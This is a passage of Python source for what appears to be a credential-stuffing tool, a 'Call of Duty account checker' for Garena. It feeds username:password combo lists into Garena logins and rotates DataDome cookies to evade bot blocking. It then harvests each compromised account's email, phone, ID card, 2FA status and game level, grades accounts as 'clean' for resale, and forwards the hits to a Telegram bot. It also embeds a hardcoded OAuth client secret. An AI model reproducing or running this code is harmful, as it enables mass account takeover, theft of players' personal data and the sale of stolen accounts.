        random_id = str(int(time.time() * 1000))
        grant_url = "https://100082.connect.garena.com/oauth/token/grant"
        grant_headers = {
            "Host": "100082.connect.garena.com", "Connection": "keep-alive", "sec-ch-ua-platform": "\"Android\"",
            "User-Agent": "Mozilla/5.0 (Linux; Android 15; Lenovo TB-9707F Build/AP3A.240905.015.A2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/144.0.7559.59 Mobile Safari/537.36; GarenaMSDK/5.12.1(Lenovo TB-9707F ;Android 15;en;us;)",
            "Accept": "application/json, text/plain, */*", "sec-ch-ua": "\"Not(A:Brand\";v=\"8\", \"Chromium\";v=\"144\", \"Android WebView\";v=\"144\"",
            "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8", "sec-ch-ua-mobile": "?1", "Origin": "https://100082.connect.garena.com",
            "X-Requested-With": "com.garena.game.codm", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Dest": "empty",
            "Referer": "https://100082.connect.garena.com/universal/oauth?client_id=100082&locale=en-US&create_grant=true&login_scenario=normal&redirect_uri=gop100082://auth/&response_type=code",
            "Accept-Encoding": "gzip, deflate, br, zstd", "Accept-Language": "en-US,en;q=0.9"
        }
        device_id = f"02-{str(uuid.uuid4())}"
        grant_data = f"client_id=100082&redirect_uri=gop100082%3A%2F%2Fauth%2F&response_type=code&id={random_id}"
        grant_response = session.post(grant_url, headers=grant_headers, data=grant_data, timeout=15)
        grant_json = grant_response.json()
        auth_code = grant_json.get("code", "")
        if not auth_code: return "", "", ""
        token_url = "https://100082.connect.garena.com/oauth/token/exchange"
        token_headers = {
            "User-Agent": "GarenaMSDK/5.12.1(Lenovo TB-9707F ;Android 15;en;us;)", "Content-Type": "application/x-www-form-urlencoded",
            "Host": "100082.connect.garena.com", "Connection": "Keep-Alive", "Accept-Encoding": "gzip"
        }
        token_data = f"grant_type=authorization_code&code={auth_code}&device_id={device_id}&redirect_uri=gop100082%3A%2F%2Fauth%2F&source=2&client_id=100082&client_secret=388066813c7cda8d51c1a70b0f6050b991986326fcfb0cb3bf2287e861cfa415"
        token_response = session.post(token_url, headers=token_headers, data=token_data, timeout=15)
        token_json = token_response.json()
        access_token = token_json.get("access_token", "")
        open_id = token_json.get("open_id", "")
        uid = token_json.get("uid", "")
        return access_token, open_id, uid
    except Exception as e:
        return "", "", ""

def process_codm_callback(session, access_token, open_id=None, uid=None):
    try:
        old_callback_url = f"https://api-delete-request.codm.garena.co.id/oauth/callback/?access_token={access_token}"
        old_headers = {
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "user-agent": "Mozilla/5.0 (Linux; Android 15; Lenovo TB-9707F) AppleWebKit/537.36 Chrome/144.0.0.0 Mobile Safari/537.36",
            "referer": "https://auth.garena.com/"
        }
        old_response = session.get(old_callback_url, headers=old_headers, allow_redirects=False, timeout=15)
        location = old_response.headers.get("Location", "")
        if "err=3" in location: return None, "no_codm"
        elif "token=" in location:
            token = location.split("token=")[-1].split('&')[0]
            return token, "success"
        aos_callback_url = f"https://api-delete-request-aos.codm.garena.co.id/oauth/callback/?access_token={access_token}"
        aos_headers = {
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "user-agent": "Mozilla/5.0 (Linux; Android 15; Lenovo TB-9707F Build/AP3A.240905.015.A2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/144.0.7559.59 Mobile Safari/537.36",
            "referer": "https://100082.connect.garena.com/", "x-requested-with": "com.garena.game.codm"
        }
        aos_response = session.get(aos_callback_url, headers=aos_headers, allow_redirects=False, timeout=15)
        aos_location = aos_response.headers.get("Location", "")
        if "err=3" in aos_location: return None, "no_codm"
        elif "token=" in aos_location:
            token = aos_location.split("token=")[-1].split('&')[0]
            return token, "success"
        return None, "unknown_error"
    except Exception as e:
        return None, "error"

def get_codm_user_info(session, token):
    try:
        try:
            parts = token.split('.')
            if len(parts) == 3:
                payload = parts[1]
                padding = 4 - len(payload) % 4
                if padding != 4: payload += '=' * padding
                decoded = base64.urlsafe_b64decode(payload)
                jwt_data = json.loads(decoded)
                user_data = jwt_data.get("user", {})
                if user_data:
                    return {
                        "codm_nickname": user_data.get("codm_nickname", user_data.get("nickname", "N/A")),
                        "codm_level": user_data.get("codm_level", "N/A"), "region": user_data.get("region", "N/A"),
                        "uid": user_data.get("uid", "N/A"), "open_id": user_data.get("open_id", "N/A"), "t_open_id": user_data.get("t_open_id", "N/A")
                    }
        except: pass
        url = "https://api-delete-request-aos.codm.garena.co.id/oauth/check_login/"
        headers = {
            "accept": "application/json, text/plain, */*", "codm-delete-token": token,
            "origin": "https://delete-request-aos.codm.garena.co.id", "referer": "https://delete-request-aos.codm.garena.co.id/",
            "user-agent": "Mozilla/5.0 (Linux; Android 15; Lenovo TB-9707F Build/AP3A.240905.015.A2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/144.0.7559.59 Mobile Safari/537.36",
            "x-requested-with": "com.garena.game.codm"
        }
        response = session.get(url, headers=headers, timeout=15)
        data = response.json()
        user_data = data.get("user", {})
        if user_data:
            return {
                "codm_nickname": user_data.get("codm_nickname", "N/A"), "codm_level": user_data.get("codm_level", "N/A"),
                "region": user_data.get("region", "N/A"), "uid": user_data.get("uid", "N/A"),
                "open_id": user_data.get("open_id", "N/A"), "t_open_id": user_data.get("t_open_id", "N/A")
            }
        return {}
    except Exception as e:
        return {}

def check_codm_account(session, account, ui_log=None):
    codm_info = {}
    has_codm = False
    try:
        access_token, open_id, uid = get_codm_access_token(session)
        if not access_token: return has_codm, codm_info
        codm_token, status = process_codm_callback(session, access_token, open_id, uid)
        if status == "no_codm":
            if ui_log: ui_log(f"[☘︎] No Call of Duty account", "yellow")
            return has_codm, codm_info
        elif status != "success" or not codm_token:
            return has_codm, codm_info
        codm_info = get_codm_user_info(session, codm_token)
        if codm_info:
            has_codm = True
            if ui_log: ui_log(f"[ You found account level {codm_info.get('codm_level', 'N/A')} ]", "green")
    except Exception as e:
        pass
    return has_codm, codm_info

def parse_account_details(data):
    user_info = data.get('user_info', {})
    account_info = {
        'uid': user_info.get('uid', 'N/A'), 'username': user_info.get('username', 'N/A'),
        'nickname': user_info.get('nickname', 'N/A'), 'email': user_info.get('email', 'N/A'),
        'email_verified': bool(user_info.get('email_v', 0)), 'email_verified_time': user_info.get('email_verified_time', 0),
        'email_verify_available': bool(user_info.get('email_verify_available', False)),
        'security': {
            'password_strength': user_info.get('password_s', 'N/A'), 'two_step_verify': bool(user_info.get('two_step_verify_enable', 0)),
            'authenticator_app': bool(user_info.get('authenticator_enable', 0)), 'facebook_connected': bool(user_info.get('is_fbconnect_enabled', False)),
            'facebook_account': user_info.get('fb_account', None), 'suspicious': bool(user_info.get('suspicious', False))
        },
        'personal': {
            'real_name': user_info.get('realname', 'N/A'), 'id_card': user_info.get('idcard', 'N/A'),
            'id_card_length': user_info.get('idcard_length', 'N/A'), 'country': user_info.get('acc_country', 'N/A'),
            'country_code': user_info.get('country_code', 'N/A'), 'mobile_no': user_info.get('mobile_no', 'N/A'),
            'mobile_binding_status': "Bound" if user_info.get('mobile_binding_status', 0) and user_info.get('mobile_no', '') else "Not Bound",
            'extra_data': user_info.get('realinfo_extra_data', {})
        },
        'profile': {
            'avatar': user_info.get('avatar', 'N/A'), 'signature': user_info.get('signature', 'N/A'), 'shell_balance': user_info.get('shell', 0)
        },
        'status': {
            'account_status': "Active" if user_info.get('status', 0) == 1 else "Inactive",
            'whitelistable': bool(user_info.get('whitelistable', False)), 'realinfo_updatable': bool(user_info.get('realinfo_updatable', False))
        },
        'binds': [], 'game_info': [], 'facebook': {'fb_link': 'N/A'}
    }
    if user_info.get('fb_account') and user_info['fb_account'].get('fb_uid'):
        account_info['facebook']['fb_link'] = f"https://www.facebook.com/profile.php?id={user_info['fb_account']['fb_uid']}"
    email = account_info['email']
    if email != 'N/A' and email and not email.startswith('***') and '@' in email and not email.endswith('@gmail.com') and '****' not in email:
        account_info['binds'].append('Email')
    mobile_no = account_info['personal']['mobile_no']
    if mobile_no != 'N/A' and mobile_no and mobile_no.strip():
        account_info['binds'].append('Phone')
    if account_info['security']['facebook_connected']:
        account_info['binds'].append('Facebook')
    id_card = account_info['personal']['id_card']
    if id_card != 'N/A' and id_card and id_card.strip():
        account_info['binds'].append('ID Card')
    if user_info.get('email_v', 0) == 1 or len(account_info['binds']) > 0:
        account_info['is_clean'] = False
        account_info['bind_status'] = f"Bound ({', '.join(account_info['binds']) or 'Email Verified'})"
    else:
        account_info['is_clean'] = True
        account_info['bind_status'] = "Clean"
    security_indicators = []
    if account_info['security']['two_step_verify']: security_indicators.append("2FA")
    if account_info['security']['authenticator_app']: security_indicators.append("Auth App")
    if account_info['security']['suspicious']: security_indicators.append("[WARNING] Suspicious")
    account_info['security_status'] = "[SUCCESS] Normal" if not security_indicators else " | ".join(security_indicators)
    return account_info

def format_hit(username, password, shell, level, region, nickname, uid, mobile, email, email_ver, two_step, auth_app, country, last_login, is_clean, has_codm=True, codm_level=None, suspicious=False, fb_link='N/A', id_card='N/A', email_verified=False):
    if codm_level is not None:
        level = codm_level
    active_status = "Unknown"
    if last_login != 'Unknown':
        try:
            ll_str = last_login.replace(' UTC', '')
            ll_date = datetime.strptime(ll_str, '%Y-%m-%d %H:%M:%S')
            days_ago = (datetime.now(timezone.utc) - ll_date).days
            if days_ago <= 3:
                active_status = "Active"
            else:
                active_status = f"Inactive ({days_ago} days ago)"
        except Exception:
            active_status = "Unknown"
    clean_text = "CLEAN" if is_clean else "NOT CLEAN"
    suspicious_text = "Yes" if suspicious else "No"
    id_card_str = "Yes" if id_card and id_card != 'N/A' and id_card.strip() else "No"
    lines = []
    lines.append("╔══ Account Overview")
    lines.append(f"║   ╠══ Username: {username}")
    lines.append(f"║   ╠══ Password: {password}")
    lines.append(f"║   ╠══ Status: {active_status}")
    lines.append(f"║   ╠══ Shell Balance: {shell}")
    lines.append(f"║   ╠══ Suspicious: {suspicious_text}")
    lines.append(f"║   ╠══ Facebook URL: {fb_link}")
    lines.append(f"║   ╚══ ═══════════════════════════════════")
    if has_codm:
        lines.append(f"║    ╔══ CODM Details")
        lines.append(f"║    ║   ╠══ Nickname: {nickname}")
        lines.append(f"║    ║   ╠══ Level: {level}")
        lines.append(f"║    ║   ╠══ Region: {region}")
        lines.append(f"║    ║   ╠══ UID: {uid}")
        lines.append(f"║    ║   ╚══ ═══════════════════════════════════")
    else:
        lines.append(f"║    ╔══ CODM Details")
        lines.append(f"║    ║   ╚══ No CODM account found")
    lines.append(f"║    ╚══ ═══════════════════════════════════")
    lines.append(f"║     ╔══ Bind Details")
    lines.append(f"║     ║   ╠══ Mobile: {mobile if mobile != 'N/A' else 'None'}")
    email_ver_status = "verified" if email_ver.lower() == 'yes' else "not verified"
    lines.append(f"║     ║   ╠══ Email: {email} [{email_ver_status}]")
    lines.append(f"║     ║   ╠══ 2FA: {two_step}")
    lines.append(f"║     ║   ╠══ Authenticator: {auth_app}")
    lines.append(f"║     ║   ╠══ Country: {country} {get_country_emoji(country)}")
    lines.append(f"║     ║   ╠══ ID Card: {id_card_str}")
    lines.append(f"║     ║   ╠══ Bind Status: {'Clean' if is_clean else 'Bound'}")
    lines.append(f"║     ║   ╚══ Security: {'Normal' if not (two_step == 'Yes' or auth_app == 'Yes') else '2FA/Auth'}")
    lines.append(f"║     ╚══ ═══════════════════════════════════")
    lines.append(f"║      ╚══ Developed by @rrielqt")
    return "\n".join(lines)

def save_account_results(account, password, details, codm_info, is_valid=True, result_folder='Results'):
    os.makedirs(result_folder, exist_ok=True)
    if not is_valid:
        with open(os.path.join(result_folder, 'invalid.txt'), 'a', encoding='utf-8') as f:
            f.write(f"{account}:{password}\n")
        return
    username = details.get('username', account)
    email = details.get('email', 'N/A')
    email_verified = "Yes" if details.get('email_verified') else "No"
    mobile = details.get('personal', {}).get('mobile_no', 'N/A')
    country = details.get('personal', {}).get('country', 'N/A')
    shell = details.get('profile', {}).get('shell_balance', 0)
    is_clean = details.get('is_clean', False)
    two_step = "Yes" if details.get('security', {}).get('two_step_verify') else "No"
    authenticator = "Yes" if details.get('security', {}).get('authenticator_app') else "No"
    suspicious = details.get('security', {}).get('suspicious', False)
    codm_nickname = codm_info.get('codm_nickname', 'N/A') if codm_info else 'N/A'
    codm_uid = codm_info.get('uid', 'N/A') if codm_info else 'N/A'
    codm_level = codm_info.get('codm_level', 'N/A') if codm_info else 'N/A'
    codm_region = codm_info.get('region', 'N/A') if codm_info else 'N/A'
    last_login = details.get('last_login', 'Unknown')
    fb_link = details.get('facebook', {}).get('fb_link', 'N/A')
    id_card = details.get('personal', {}).get('id_card', 'N/A')
    formatted = format_hit(
        username=username, password=password, shell=shell, level=codm_level, region=codm_region,
        nickname=codm_nickname, uid=codm_uid, mobile=mobile, email=email, email_ver=email_verified,
        two_step=two_step, auth_app=authenticator, country=country, last_login=last_login, is_clean=is_clean,
        has_codm=bool(codm_info), codm_level=codm_level, suspicious=suspicious, fb_link=fb_link, id_card=id_card,
        email_verified=details.get('email_verified', False)
    )
    valid_file = os.path.join(result_folder, 'valid.txt')
    with open(valid_file, 'a', encoding='utf-8') as f:
        f.write(formatted + "\n" + "="*80 + "\n\n")
    if codm_info and codm_level != 'N/A':
        try:
            lvl = int(codm_level)
            if 1 <= lvl <= 50:
                range_file = "1-50_level.txt"
            elif 51 <= lvl <= 100:
                range_file = "51-100_level.txt"
            elif 101 <= lvl <= 150:
                range_file = "101-150_level.txt"
            elif 151 <= lvl <= 200:
                range_file = "151-200_level.txt"
            elif 201 <= lvl <= 250:
                range_file = "201-250_level.txt"
            elif 251 <= lvl <= 300:
                range_file = "251-300_level.txt"
            elif 301 <= lvl <= 350:
                range_file = "301-350_level.txt"
            elif 351 <= lvl <= 400:
                range_file = "351-400_level.txt"
            else:
                return
            file_path = os.path.join(result_folder, range_file)
            with open(file_path, 'a', encoding='utf-8') as f:
                f.write(formatted + "\n" + "="*80 + "\n\n")
        except:
            pass

def processaccount(session, account, password, cookie_manager, datadome_manager, live_stats, result_folder='Results', ui_log=None):
    try:
        datadome_manager.clear_session_datadome(session)
        current_datadome = datadome_manager.get_datadome()
        if current_datadome:
            datadome_manager.set_session_datadome(session, current_datadome)
        v1, v2, new_datadome = prelogin(session, account, datadome_manager, retries_total=3, ui_log=ui_log, cookie_manager=cookie_manager)
        if v1 == "IP_BLOCKED":
            return f"[⚠︎] {account}: IP BLOCKED NEW DATADOME REQUIRED"
        if not v1 or not v2:
            live_stats.update_stats(valid=False)
            return f"[⚠︎] {account}: INVALID (LOGIN FAILED)"
        if new_datadome:
            datadome_manager.set_datadome(new_datadome)
            datadome_manager.set_session_datadome(session, new_datadome)
        sso_key = login(session, account, password, v1, v2, ui_log=ui_log)
        if not sso_key:
            live_stats.update_stats(valid=False)
            return f"[⚠︎] {account}: INVALID (LOGIN FAILED)"
        current_cookies = session.cookies.get_dict()
        cookie_parts = []
        for cookie_name in ['apple_state_key', 'datadome', 'sso_key']:
            if cookie_name in current_cookies:
                cookie_parts.append(f"{cookie_name}={current_cookies[cookie_name]}")
        cookie_header = '; '.join(cookie_parts) if cookie_parts else ''
        headers = {'accept': '*/*', 'referer': 'https://account.garena.com/', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/129.0.0.0 Safari/537.36'}
        if cookie_header: headers['cookie'] = cookie_header
        response = session.get('https://account.garena.com/api/account/init', headers=headers, timeout=30)
        if response.status_code == 403:
            if datadome_manager.handle_403(session, ui_log=ui_log, cookie_manager=cookie_manager):
                return f"[⚠︎] {account}: IP BLOCKED NEW DATADOME REQUIRED"
            live_stats.update_stats(valid=False)
            return f"[⚠︎] {account}: IP BLOCKED NEW DATADOME REQUIRED"
        try:
            account_data = response.json()
        except json.JSONDecodeError:
            live_stats.update_stats(valid=False)
            return f"[⚠︎] {account}: INVALID (LOGIN FAILED)"
        if 'error' in account_data:
            live_stats.update_stats(valid=False)
            return f"[⚠︎] {account}: INVALID (LOGIN FAILED)"
        if 'user_info' in account_data:
            details = parse_account_details(account_data)
        else:
            details = parse_account_details({'user_info': account_data})
        login_history = account_data.get('login_history') or []
        last_login_ts = None
        if isinstance(login_history, list) and login_history:
            entry = login_history[0]
            if isinstance(entry, dict):
                last_login_ts = entry.get('timestamp')
        try:
            if last_login_ts:
                last_login = datetime.fromtimestamp(int(last_login_ts), tz=timezone.utc).strftime('%Y-%m-%d %H:%M:%S UTC')
            else:
                last_login = 'Unknown'
        except:
            last_login = 'Unknown'
        has_codm, codm_info = check_codm_account(session, account, ui_log=ui_log)
        def is_codm_invalid(info):
            if not info: return True
            if isinstance(info, str): return "error" in info.lower()
            if isinstance(info, dict):
                invalid_values = ["", "N/A", "NONE", "NULL", "ERROR"]
                if all(str(v).strip().upper() in invalid_values for v in info.values()): return True
                if str(info.get('codm_nickname', '')).strip().upper() in invalid_values: return True
            return False
        has_valid_codm = has_codm and not is_codm_invalid(codm_info)
        username = details.get('username', account)
        email = details.get('email', 'N/A')
        email_verified_flag = details.get('email_verified', False)
        email_ver = "Yes" if email_verified_flag else "No"
        mobile = details.get('personal', {}).get('mobile_no', 'N/A')
        mobile_display = mobile if mobile and str(mobile).strip() else "None"
        shell = details.get('profile', {}).get('shell_balance', 'N/A')
        two_step_enabled = "Yes" if details.get('security', {}).get('two_step_verify') else "No"
        authenticator_enabled = "Yes" if details.get('security', {}).get('authenticator_app') else "No"
        acc_country = details.get('personal', {}).get('country', 'N/A')
        is_clean = details.get('is_clean', False)
        codm_nickname = codm_info.get('codm_nickname', 'N/A') if has_codm else 'N/A'
        codm_uid = codm_info.get('uid', 'N/A') if has_codm else 'N/A'
        codm_level = codm_info.get('codm_level', 'N/A') if has_codm else 'N/A'
        codm_region = codm_info.get('region', 'N/A') if has_codm else 'N/A'
        live_stats.update_highest(shell, codm_level, is_clean)
        details['last_login'] = last_login
        details['facebook'] = {'fb_link': details.get('facebook', {}).get('fb_link', 'N/A')}
        if not has_valid_codm:
            save_account_results(account, password, details, None, is_valid=True, result_folder=result_folder)
            live_stats.update_stats(valid=True, clean=is_clean, has_codm=False, details=details)
            formatted = format_hit(
                username=username, password=password, shell=shell, level=codm_level, region=codm_region,
                nickname=codm_nickname, uid=codm_uid, mobile=mobile_display, email=email, email_ver=email_ver,
                two_step=two_step_enabled, auth_app=authenticator_enabled, country=acc_country, last_login=last_login,
                is_clean=is_clean, has_codm=False, codm_level=codm_level, suspicious=details.get('security',{}).get('suspicious',False),
                fb_link=details.get('facebook',{}).get('fb_link','N/A'), id_card=details.get('personal',{}).get('id_card','N/A'),
                email_verified=email_verified_flag
            )
            return add_indent(formatted, 3)
        fresh_datadome = datadome_manager.extract_datadome_from_session(session)
        if fresh_datadome:
            cookie_manager.save_cookie(fresh_datadome)
        save_account_results(account, password, details, codm_info, is_valid=True, result_folder=result_folder)
        live_stats.update_stats(valid=True, clean=is_clean, has_codm=has_codm, details=details)
        live_stats.add_codm_details(codm_level, acc_country)
        with live_stats.lock:
            live_stats.top_accounts.append({'level': int(codm_level) if codm_level != 'N/A' else 0, 'country': acc_country, 'ign': codm_nickname, 'clean': is_clean})
            live_stats.top_accounts.sort(key=lambda x: x['level'], reverse=True)
            live_stats.top_accounts = live_stats.top_accounts[:3]
        if TG_SETTINGS and has_codm and codm_level != 'N/A':
            try:
                lvl = int(codm_level)
                if TG_SETTINGS.get('level_range') != "ALL":
                    low, high = map(int, TG_SETTINGS['level_range'].split('-'))
                    if low <= lvl <= high:
                        if not TG_SETTINGS.get('clean_only') or (TG_SETTINGS['clean_only'] and is_clean):
                            send_telegram_hit(TG_SETTINGS['bot_token'], TG_SETTINGS['chat_id'], account, password, details, codm_info, is_clean)
                else:
                    if not TG_SETTINGS.get('clean_only') or (TG_SETTINGS['clean_only'] and is_clean):
                        send_telegram_hit(TG_SETTINGS['bot_token'], TG_SETTINGS['chat_id'], account, password, details, codm_info, is_clean)
            except:
                pass
        formatted = format_hit(
            username=username, password=password, shell=shell, level=codm_level, region=codm_region,
            nickname=codm_nickname, uid=codm_uid, mobile=mobile_display, email=email, email_ver=email_ver,
            two_step=two_step_enabled, auth_app=authenticator_enabled, country=acc_country, last_login=last_login,
            is_clean=is_clean, has_codm=True, codm_level=codm_level, suspicious=details.get('security',{}).get('suspicious',False),
            fb_link=details.get('facebook',{}).get('fb_link','N/A'), id_card=details.get('personal',{}).get('id_card','N/A'),
            email_verified=email_verified_flag
        )
        return add_indent(formatted, 3)
    except Exception as e:
        live_stats.update_stats(valid=False)
        return f"[⚠︎] {account}: ERROR: {str(e)}"

def find_and_list_account_files():
    combo_dir = 'Combo'
    if not os.path.exists(combo_dir):
        os.makedirs(combo_dir)
        return None
    file_details = []
    for filename in os.listdir(combo_dir):
        file_path = os.path.join(combo_dir, filename)
        if os.path.isfile(file_path) and filename.endswith(".txt"):
            try:
                with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                    line_count = sum(1 for _ in f if _.strip())
                file_size = os.path.getsize(file_path)
                file_details.append((file_path, file_size, line_count))
            except:
                pass
    if not file_details:
        return None
    table = Table(title="[bold cyan]SELECT A COMBO FILE[/]", box=box.HEAVY, border_style="bright_green", width=100)
    table.add_column("NO.", style="yellow", justify="right")
    table.add_column("FILENAME", style="white")
    table.add_column("SIZE", style="cyan")
    table.add_column("LINES", style="magenta")
    for i, (path, size, count) in enumerate(file_details, 1):
        name = os.path.basename(path)
        if len(name) > 50:
            name = name[:47] + '...'
        size_str = format_size(size)
        count_str = f"{count:,}"
        table.add_row(f"[ {i} ]", name, size_str, count_str)
    console.print(table)
    return [item[0] for item in file_details]

def preview_file_lines(file_path, num_lines=5):
    try:
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            lines = [f.readline().strip() for _ in range(num_lines) if f]
        return lines
    except:
        return []

def select_input_file_flow(show_auto_remove=False):
    selected_file_path = None
    while True:
        available_files = find_and_list_account_files()
        if available_files:
            choice = Prompt.ask("[bold yellow]➤ SELECT COMBO FILE[/bold yellow]", choices=[str(i) for i in range(1, len(available_files)+1)], default="1")
            file_choice = int(choice) - 1
            if 0 <= file_choice < len(available_files):
                selected_file_path = available_files[file_choice]
                preview = preview_file_lines(selected_file_path, 5)
                if preview:
                    preview_text = "\n".join([f"   [dim]{line[:80]}{'...' if len(line)>80 else ''}[/dim]" for line in preview if line])
                    console.print(Panel(preview_text, title="[bold cyan]FILE PREVIEW (first 5 lines)[/bold cyan]", border_style="cyan", width=100))
                break
            else:
                console.print(f"  [red]Invalid number.[/]")
        else:
            input(f"  [yellow]No combo found in 'Combo' folder. Press Enter to refresh...[/]")
    dup_choice = rich_confirm("REMOVE DUPLICATE LINES?")
    if dup_choice:
        prompt_for_duplicate_removal(selected_file_path)
    if show_auto_remove:
        auto_choice = rich_confirm("AUTO-REMOVE CHECKED LINES?")
        return selected_file_path, auto_choice
    return selected_file_path

def prompt_for_duplicate_removal(file_path):
    try:
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            lines = f.readlines()
        original_count = len(lines)
        unique_lines = list(dict.fromkeys([line for line in lines if line.strip()]))
        duplicates_removed = original_count - len(unique_lines)
        if duplicates_removed > 0:
            with open(file_path, 'w', encoding='utf-8') as f:
                f.writelines(unique_lines)
            console.print(f"  [green]✓ Removed {duplicates_removed} duplicate line(s).[/]")
        else:
            console.print(f"  [green]✓ No duplicates were found.[/]")
    except Exception as e:
        console.print(f"  [red]Error during duplicate removal: {e}[/]")

def build_live_stats_ui(stats):
    checked = stats.get('checked', 0)
    total = stats.get('total', 0)
    valid = stats.get('valid', 0)
    invalid = stats.get('invalid', 0)
    clean = stats.get('clean', 0)
    not_clean = stats.get('not_clean', 0)
    has_codm = stats.get('has_codm', 0)
    progress = (checked / total * 100) if total > 0 else 0
    bar_len = 30
    filled = int(bar_len * progress / 100)
    bar = '█' * filled + '░' * (bar_len - filled)
    content = (
        f" {bar} {progress:.1f}%\n"
        f" Valid: {valid} | Invalid: {invalid} | Clean: {clean} | Not Clean: {not_clean} | CODM: {has_codm}"
    )
    panel = Panel(
        content,
        title="[bold cyan]Live Statistics[/bold cyan]",
        border_style="bright_blue",
        padding=(1, 2),
        box=box.ROUNDED
    )
    return panel

def display_aesthetic_summary(stats, start_time, end_time, top_accounts, country_dist):
    total = stats.get('total', 0)
    checked = stats.get('checked', 0)
    valid = stats.get('valid', 0)
    invalid = stats.get('invalid', 0)
    clean = stats.get('clean', 0)
    bound = valid - clean
    has_codm = stats.get('has_codm', 0)

    duration = (end_time - start_time).total_seconds()
    minutes = int(duration // 60)
    seconds = int(duration % 60)
    rate = checked / duration if duration > 0 else 0

    avg_level = 0
    if has_codm > 0:
        total_level = sum(acc.get('level', 0) for acc in top_accounts if acc.get('level', 0) > 0)
        count = len([a for a in top_accounts if a.get('level', 0) > 0])
        avg_level = total_level / count if count else 0

    main_table = Table(
        title="[bold bright_green]⚡ SYSTEM CORE[/bold bright_green]",
        box=box.HEAVY_EDGE,
        border_style="bright_green",
        show_header=False
    )
    main_table.add_column("Metric", style="bold white")
    main_table.add_column("Value", style="cyan", justify="right")

    main_table.add_row("📦 Checked", f"{checked}/{total}")
    main_table.add_row("✅ Valid", f"[green]{valid}[/green]")
    main_table.add_row("❌ Invalid", f"[red]{invalid}[/red]")
    main_table.add_row("🧼 Clean", f"[bright_green]{clean}[/bright_green]")
    main_table.add_row("🔗 Bound", f"[yellow]{bound}[/yellow]")
    main_table.add_row("🎮 CODM", f"[cyan]{has_codm}[/cyan]")
    main_table.add_row("📊 Avg Level", f"{avg_level:.1f}")
    main_table.add_row("🏆 Highest", f"{stats.get('high_lvl', 0)}")
    main_table.add_row("✨ Clean Highest", f"{stats.get('high_clean', 0)}")
    main_table.add_row("⏱ Time", f"{minutes}m {seconds}s")
    main_table.add_row("⚡ Rate", f"{rate:.2f}/s")

    level_cats = {
        "🔥 350+": {"clean": 0, "not_clean": 0},
        "⚡ 250–349": {"clean": 0, "not_clean": 0},
        "📈 100–249": {"clean": 0, "not_clean": 0},
        "🌱 <100": {"clean": 0, "not_clean": 0}
    }
    for acc in top_accounts:
        lvl = acc.get('level', 0)
        is_clean = acc.get('clean', False)
        if lvl >= 350: cat = "🔥 350+"
        elif lvl >= 250: cat = "⚡ 250–349"
        elif lvl >= 100: cat = "📈 100–249"
        else: cat = "🌱 <100"
        if is_clean:
            level_cats[cat]["clean"] += 1
        else:
            level_cats[cat]["not_clean"] += 1

    level_table = Table(
        title="[bold yellow]📊 LEVEL DISTRIBUTION[/bold yellow]",
        box=box.HEAVY_EDGE,
        border_style="yellow"
    )
    level_table.add_column("Tier")
    level_table.add_column("Clean", justify="center")
    level_table.add_column("Bound", justify="center")
    level_table.add_column("Visual")

    for cat, counts in level_cats.items():
        total_cat = counts["clean"] + counts["not_clean"]
        if total_cat == 0:
            bar = "—"
        else:
            ratio = counts["clean"] / total_cat
            bar_len = 10
            clean_blocks = int(ratio * bar_len)
            bar = "█" * clean_blocks + "░" * (bar_len - clean_blocks)
        level_table.add_row(cat, str(counts["clean"]), str(counts["not_clean"]), bar)

    country_counts = {}
    for c in country_dist:
        clean_c = re.sub(r'\s*\([^)]*\)', '', c).strip()
        country_counts[clean_c] = country_counts.get(clean_c, 0) + 1
    sorted_countries = sorted(country_counts.items(), key=lambda x: x[1], reverse=True)[:5]

    country_table = Table(
        title="[bold magenta]🌍 SERVERS[/bold magenta]",
        box=box.HEAVY_EDGE,
        border_style="magenta"
    )
    country_table.add_column("Region")
    country_table.add_column("Count", justify="right")
    country_table.add_column("Load")

    for country, cnt in sorted_countries:
        pct = (cnt / valid * 100) if valid > 0 else 0
        bar_len = 12
        filled = int((pct / 100) * bar_len)
        bar = "█" * filled + "░" * (bar_len - filled)
        country_table.add_row(f"{country} {get_country_emoji(country)}", str(cnt), bar)

    security_stats = {
        "🔐 2FA": stats.get('two_step_count', 0),
        "📱 Auth": stats.get('auth_app_count', 0),
        "📧 Mail": stats.get('email_ver_count', 0),
        "⚠️ Risk": stats.get('suspicious_count', 0)
    }
    security_table = Table(
        title="[bold red]🛡 SECURITY[/bold red]",
        box=box.HEAVY_EDGE,
        border_style="red"
    )
    security_table.add_column("Layer")
    security_table.add_column("Count", justify="right")
    security_table.add_column("State")

    for feature, cnt in security_stats.items():
        bar_len = 10
        filled = int((cnt / valid) * bar_len) if valid > 0 else 0
        bar = "■" * filled + "□" * (bar_len - filled)
        security_table.add_row(feature, str(cnt), bar)

    console.print(main_table)
    console.print()
    console.print(level_table)
    console.print()
    console.print(country_table)
    console.print()
    console.print(security_table)
    console.print()
    console.print("[dim]⚡ scan complete • rrielqt[/dim]")

def display_thank_you():
    thank_you_text = """
𝐓𝐇𝐀𝐍𝐊 𝐘𝐎𝐔 𝐅𝐎𝐑 𝐔𝐒𝐈𝐍𝐆 𝐑𝐈𝐄𝐋 𝐂𝐀𝐋𝐋 𝐎𝐅 𝐃𝐔𝐓𝐘
𝐀𝐂𝐂𝐎𝐔𝐍𝐓 𝐂𝐇𝐄𝐂𝐊𝐄𝐑

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

📱 Telegram Username : @rrielqt
🔗 Telegram Link     : t.me/rrielqt
📢 Telegram Channel  : https://t.me/rriellq
🐙 GitHub            : Mr.Spec3r
🎵 Spotify           : about you
📱 TikTok            : @xxyrrielha
🔗 TikTok Link       : https://tiktok.com/@xxyrrielha?_r=1&_t=ZS-95QId8SOGCj
📝 Pastebin          : rrielqtfv

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
"""
    console.print(thank_you_text)

def main():
    global TG_SETTINGS
    try:
        clear_screen()
